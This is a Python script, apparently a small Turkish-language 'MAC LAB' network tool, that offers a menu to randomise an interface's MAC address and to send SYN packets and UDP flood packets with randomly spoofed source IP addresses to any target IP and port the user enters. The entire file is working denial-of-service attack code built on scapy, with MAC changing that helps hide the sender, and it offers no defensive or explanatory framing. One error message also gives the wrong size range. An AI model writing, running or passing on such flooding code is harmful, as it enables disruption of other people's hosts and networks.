import subprocess
import re
import random
from scapy.all import *

# Dil seçeneğini tutan değişken
selected_language = ""

def get_random_mac_address():
    # Rastgele bir MAC adresi oluşturur.
    mac_parts = [format(random.randint(0x00, 0xff), '02x') for _ in range(6)]
    return ':'.join(mac_parts)

def change_mac_address(interface, new_mac):
    # Belirtilen ağ arayüzünün MAC adresini değiştirir.
    subprocess.call(["sudo", "ip", "link", "set", "dev", interface, "down"])
    subprocess.call(["sudo", "ip", "link", "set", "dev", interface, "address", new_mac])
    subprocess.call(["sudo", "ip", "link", "set", "dev", interface, "up"])

def change_mac_and_print(interface):
    # Ağ arayüzünün MAC adresini değiştirir ve yeni MAC adresini ekrana yazdırır.
    new_mac_address = get_random_mac_address()
    change_mac_address(interface, new_mac_address)
    print(f"\nMAC adresi başarıyla değiştirildi. Yeni MAC adresi: {new_mac_address}")

def list_network_interfaces():
    # Sistemdeki ağ arayüzlerini listeler.
    try:
        result = subprocess.check_output(['ip', 'link'], universal_newlines=True)
        return result
    except subprocess.CalledProcessError as error:
        return ("Hata Kodu: " + str(error.returncode), "\n Hata Çıktısı: " + str(error.output), "\nİnterface'ler Listelenemedi.")

def select_network_interface():
    # Kullanıcıdan ağ arayüzü seçimini alır.
    interfaces = list_network_interfaces()
    print("Mevcut İnterface'ler:")
    interface_list = re.findall(r'^\d+: (\S+):', interfaces, re.MULTILINE)
    for i, interface in enumerate(interface_list, 1):
        print(f"{i}. {interface}")

    while True:
        try:
            selection = int(input("İnterface seçin (1 - n): "))
            if 1 <= selection <= len(interface_list):
                return interface_list[selection - 1]
            else:
                print("Geçersiz bir seçenek girdiniz. Lütfen doğru sayı girin.")
        except ValueError:
            print("Geçersiz bir giriş. Lütfen bir sayı girin.")

def random_ip_generator():
    # Rastgele bir IP adresi oluşturur.
    return '.'.join(str(random.randint(0, 255)) for _ in range(4))

def send_syn_packet(target_ip, target_port, packet_count, syn_packet_size):
    # Belirtilen hedefe SYN paketi gönderir.
    conf.verb = 0
    for _ in range(packet_count):
        source_ip = random_ip_generator()
        arp_request = ARP(op=1, pdst=target_ip)
        arp_response = sr1(arp_request, timeout=1, verbose=0)

        if arp_response:
            target_mac = arp_response.hwsrc
            packet = Ether(dst=target_mac) / IP(src=source_ip, dst=target_ip) / TCP(dport=target_port, flags="S") / Raw(RandString(size=syn_packet_size))
            sendp(packet)

    print(f"SYN paketi {target_ip}:{target_port} adresine gönderildi.")

def send_syn_and_print():
    while True:
        syn_packet_size_input = input("SYN paket boyutunu belirtin (minimum 20, maksimum 40): ")

        try:
            syn_packet_size = int(syn_packet_size_input)
            if 20 <= syn_packet_size <= 40:
                break
            else:
                print("Geçersiz paket boyutu. Lütfen 20 ile 40 arasında bir değer girin.")
        except ValueError:
            print("Geçersiz giriş. Lütfen bir sayı girin.")

    target_ip = input("Hedef IP adresini girin: ")
    target_port = int(input("Hedef port numarasını girin: "))
    packet_count = int(input("Yollamak istediğiniz SYN paketlerinin sayısını giriniz: "))
    send_syn_packet(target_ip, target_port, packet_count, syn_packet_size)

def send_udp_flood(target_ip, target_port, packet_count, udp_packet_size):
    # Belirtilen hedefe UDP flood paketi gönderir.
    conf.verb = 0
    for _ in range(packet_count):
        source_ip = random_ip_generator()
        arp_request = ARP(op=1, pdst=target_ip)
        arp_response = sr1(arp_request, timeout=1, verbose=0)

        if arp_response:
            target_mac = arp_response.hwsrc
            packet = Ether(dst=target_mac) / IP(src=source_ip, dst=target_ip) / UDP(dport=target_port) / Raw(RandString(size=udp_packet_size))
            sendp(packet, verbose=0)

    print(f"UDP flood paketi {target_ip}:{target_port} adresine gönderildi.")

def send_udp_flood_and_print():
    while True:
        udp_packet_size_input = input("UDP paket boyutunu belirtin (minimum 50, maksimum 1400): ")

        try:
            udp_packet_size = int(udp_packet_size_input)
            if 50 <= udp_packet_size <= 1400:
                break
            else:
                print("Geçersiz paket boyutu. Lütfen 20 ile 40 arasında bir değer girin.")
        except ValueError:
            print("Geçersiz giriş. Lütfen bir sayı girin.")

    target_ip = input("Hedef IP adresini girin: ")
    target_port = int(input("Hedef port numarasını girin: "))
    packet_count = int(input("Yollamak istediğiniz UDP flood paketlerinin sayısını giriniz: "))
    send_udp_flood(target_ip, target_port, packet_count, udp_packet_size)

def print_mac_lab_art():
    print("\n" + " " * 71)
    print("       .___  ___.      ___       ______  __          ___      .______   ")
    print("       |   \/   |     /   \     /      ||  |        /   \     |   _  \  ")
    print("       |  \  /  |    /  ^  \   |  ,----'|  |       /  ^  \    |  |_)  | ")
    print("       |  |\/|  |   /  /_\  \  |  |     |  |      /  /_\  \   |   _  <  ")
    print("       |  |  |  |  /  _____  \ |  `----.|  `----./  _____  \  |  |_)  | ")
    print("       |__|  |__| /__/     \__\ \______||_______/__/     \__\ |______/  ")
    print(" " * 71)


def main_menu():
    if selected_language == "tr":
        print_mac_lab_art()
        print("\n1. İnterfaceleri listele ve MAC adresini değiştir")
        print("2. SYN Paketi Gönder")
        print("3. UDP Flood Paketi Gönder")
        print("4. Çıkış")
    elif selected_language == "en":
        print_mac_lab_art()
        print("1. List Interfaces and Change MAC Address")
        print("2. Send SYN Packet")
        print("3. Send UDP Flood Packet")
        print("4. Exit")

def select_language():
    global selected_language
    print("Select language:")
    print("1. Türkçe")
    print("2. English")
    language_choice = input("Choose language (1 or 2): ")
    
    if language_choice == "1":
        selected_language = "tr"
    elif language_choice == "2":
        selected_language = "en"
    else:
        print("Invalid choice. Defaulting to English.")
        selected_language = "en"

def main():
    global selected_language
    select_language()
    
    while True:
        main_menu()
        choice = input("Choose one of the above (1-4): ")

        if choice == '1':
            selected_interface = select_network_interface()
            change_mac_and_print(selected_interface)
        elif choice == '2':
            send_syn_and_print()
        elif choice == '3':
            send_udp_flood_and_print()
        elif choice == '4':
            print("\nExiting the program.")
            break
        else:
            print("\nInvalid choice. Please choose a number between 1 and 4.")

if __name__ == "__main__":
    main()
